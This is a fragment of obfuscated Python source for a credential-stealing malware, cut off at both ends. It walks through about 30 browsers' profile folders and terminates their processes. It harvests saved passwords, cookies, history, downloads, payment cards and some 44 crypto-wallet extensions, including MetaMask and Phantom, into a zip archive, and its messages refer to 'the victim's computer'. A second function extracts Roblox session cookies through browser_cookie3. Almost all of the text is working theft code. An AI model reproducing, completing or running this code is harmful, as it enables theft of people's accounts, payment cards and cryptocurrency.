        ("Google Chrome Beta",     os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(DNFCLRBFCQAUZDBGNAKFITTAPSKHQYRRYIHEEYIBJTOGLEGXWOGEPOABESOATHIFKEKP, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    YIJACXEKTTGIVFYQQBSCSHFOCJEILNIKEDIOBEZJKJDYIOGBTWTWKDXELREACNNUQXWSUWCMLXEICVMOKFXWDJCESUD = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    JRMPEAXXCLCZSYEPITEDBXGAWFBYVTFRHNTSFKLGOHXLQLKPOFGOTIGOROVGTTULRDDGWSFWSUYHHIWNQZPYYMDNXAPJGHE = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_proc_name in DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_proc_name in DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_files:
        if not os.path.exists(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT):
            continue

        HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP = IBCBBJGNOHAQGCRXHSJANIUCGBFORXMVWCWAXDUPDDBZHHHEWYZAKZBDLSBAWVKJTVUUPKWKGRBBJOATPDJUMALUOCJXQN(os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, 'Local State'))
        if not HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP:
            continue

        for v4r_profile in YIJACXEKTTGIVFYQQBSCSHFOCJEILNIKEDIOBEZJKJDYIOGBTWTWKDXELREACNNUQXWSUWCMLXEICVMOKFXWDJCESUD:
            RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK = os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_profile)
            if not os.path.exists(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK):
                continue

        for v4r_profile in YIJACXEKTTGIVFYQQBSCSHFOCJEILNIKEDIOBEZJKJDYIOGBTWTWKDXELREACNNUQXWSUWCMLXEICVMOKFXWDJCESUD:
            RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK = os.path.join(GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT, v4r_profile)
            if not os.path.exists(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK):
                continue
            
            if "extentions" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
                try: LYHNJZGPRKWWZEZIKXQMXZXVCAREEHFUJGECNQGFASOCXCTTGDWEMLPGICLTLAHXRORPMXQDJMYEL(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG, JRMPEAXXCLCZSYEPITEDBXGAWFBYVTFRHNTSFKLGOHXLQLKPOFGOTIGOROVGTTULRDDGWSFWSUYHHIWNQZPYYMDNXAPJGHE, KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK)
                except: pass
                
            if "passwords" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
                try: GLOEYBVICHDNXAGGVSYVEXTFMEGDKKZTHQFTSRTUJXPBATEJOYVBGOIBMGAOOLGSACCTVUKRALSUDIVWYUZJRHDBKRHF(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP)
                except: pass
            if "cookies" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
                try: IYBCPHJVXYITZWHJMJRROIKNBTQRCDJSJSFBKVZDLJILLUTHOYNKOXBLAUK(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP)
                except: pass
            if "history" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
                try: TDDXRQLBZTBVHRRRPVALRKTFOSJCHSHFQOUTZCHBXXHHPZVEGPZOZNWTSZVQBMEHWUPYUNCALTJQNZJCBRWESSOTNP(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK)
                except: pass
            if "downloads" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
                try: PMFLJSEJEQTXLZEKIJTZCIYWPBOKUFWCYSIERPATFOJDFNAYYUMRACBJJLTXUAUNUXENRVKYEBZQGYMETACOQCEOHOAKX(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK)
                except: pass
            if "cards" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
                try: GTAVLMKYSNCYOYFUSPKXFFQFGTFKVYBGEZXPHWYYLHHOQOYVTEIMSLRZFRCMMGOBBUHJPJVDSGUCCMALKGFHJNA(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP)
                except: pass

            if KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN not in HBQWDCBJAJGJKXWKFVSIGYJPIKGLTIJRXEBGQUDREUQHRZQQYOHOKYKGDEXNVAOWNFRYHACKLWAWTSHAXJCVI:
                HBQWDCBJAJGJKXWKFVSIGYJPIKGLTIJRXEBGQUDREUQHRZQQYOHOKYKGDEXNVAOWNFRYHACKLWAWTSHAXJCVI.append(KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN)

    if "passwords" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        if not DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX:
            DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX.append("No passwords was saved on the victim's computer.")
        DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX = "\n".join(DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX)
    if "cookies" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        if not RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN:
            RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN.append("No cookies was saved on the victim's computer.")
        RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN   = "\n".join(RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN)
    if "history" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        if not OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM:
            OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM.append("No history was saved on the victim's computer.")
        OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM   = "\n".join(OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM)
    if "downloads" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        if not HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA:
            HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA.append("No downloads was saved on the victim's computer.")
        HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA = "\n".join(HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA)
    if "cards" in BZIABVYUGDBIOYYNDEIWYGZVDPCLKRMBMDFFFCCFBZWRVNLMRBBNHIUXZHYRUEUCURZELIPXPEOYWUFFKMUSPWIOUBYAMAABVN:
        if not HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS:
            HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS.append("No cards was saved on the victim's computer.")
        HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS     = "\n".join(HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS)
    
    if OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX != None:
        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Passwords ({OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX}).txt", DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX)

    if ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH != None:
        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Cookies ({ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH}).txt", RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN)

    if CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE != None:
        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Cards ({CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE}).txt", HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS)

    if NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ != None:
        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Browsing History ({NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ}).txt", OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM)

    if BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA != None:
        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.writestr(f"Download History ({BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA}).txt",HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA)

    return FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM, OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX, ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH, NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ, BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA, CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE

def UKSFOFWCFPPGAXWRKBCRUZCWBMNXBHJZFNMIJQTQQSEJBUNEQEMVNZTBPRUWDOYAMXDXCOQPYKPSRTALWLNBTWMXDLJWVTFT(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import browser_cookie3
    import requests
    import json

    JHYODMGXHZGXNAHHPWBRIQFQPFFTGGTCHYPNSFKPOOOSYFHVZUTHBRINNJMWSMFRL = ""
    YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS = 0
    CJWSXJBVURATURWTOCHTUWVKVEHEBMAKBUAPHKPUFNJRBVTCGFSMONUKXJTQZ = []
    

    def MFGVOFMMLJHXQVKJDFROUFEOLDRCJXIPWUKEFTVUAUXTMQDFAFSGQYGWSRKXZVDJAMCYOSFNLOBGXCBWUK(ZINFBKZUBAFCPLLUHGKHWOHHPPSUTHTTJPUWDOAYNKYPZUJGVKUXIJNSRPCMDEIFMVGKUFAAGMRFSLLVNCP):
        try:
            JFACKYQZESHXJFZUJWTRSEEVJLFGDBKNVLIHGGORCOEOGHOUOU = ZINFBKZUBAFCPLLUHGKHWOHHPPSUTHTTJPUWDOAYNKYPZUJGVKUXIJNSRPCMDEIFMVGKUFAAGMRFSLLVNCP()
            JFACKYQZESHXJFZUJWTRSEEVJLFGDBKNVLIHGGORCOEOGHOUOU = str(JFACKYQZESHXJFZUJWTRSEEVJLFGDBKNVLIHGGORCOEOGHOUOU)
            CHVZUKXTNIZTQZUENMBWCDQRRMPRWJEWUNMKRVOUEPSENAQVFLCMJFPMKVJEHGDRFLNSEVHVNKHQUUFMWSKJHDUCJ = JFACKYQZESHXJFZUJWTRSEEVJLFGDBKNVLIHGGORCOEOGHOUOU.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            CVDLTRFLTSMGJFKGSXGUDRPFTTGJMDXYOENRVJTDCWISTNFPWTHSGNBPZDMKGLYPEI = ZINFBKZUBAFCPLLUHGKHWOHHPPSUTHTTJPUWDOAYNKYPZUJGVKUXIJNSRPCMDEIFMVGKUFAAGMRFSLLVNCP.__name__
            return CHVZUKXTNIZTQZUENMBWCDQRRMPRWJEWUNMKRVOUEPSENAQVFLCMJFPMKVJEHGDRFLNSEVHVNKHQUUFMWSKJHDUCJ, CVDLTRFLTSMGJFKGSXGUDRPFTTGJMDXYOENRVJTDCWISTNFPWTHSGNBPZDMKGLYPEI
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    VVLMYFLTQPSIAGWUFNLYPFAKCFBJDNDKLBFGXOMBGNXPUTYAXLRXQZLSNEIFTVKRM = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in VVLMYFLTQPSIAGWUFNLYPFAKCFBJDNDKLBFGXOMBGNXPUTYAXLRXQZLSNEIFTVKRM:
        v4r_c00ki3, CVDLTRFLTSMGJFKGSXGUDRPFTTGJMDXYOENRVJTDCWISTNFPWTHSGNBPZDMKGLYPEI = MFGVOFMMLJHXQVKJDFROUFEOLDRCJXIPWUKEFTVUAUXTMQDFAFSGQYGWSRKXZVDJAMCYOSFNLOBGXCBWUK(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in CJWSXJBVURATURWTOCHTUWVKVEHEBMAKBUAPHKPUFNJRBVTCGFSMONUKXJTQZ:
                YPIUQEPDRXODFAIQRAWFMWTPTWXZHXRPRZHZNWTNBMIXEZTYRNMS += 1
                CJWSXJBVURATURWTOCHTUWVKVEHEBMAKBUAPHKPUFNJRBVTCGFSMONUKXJTQZ.append(v4r_c00ki3)
                try:
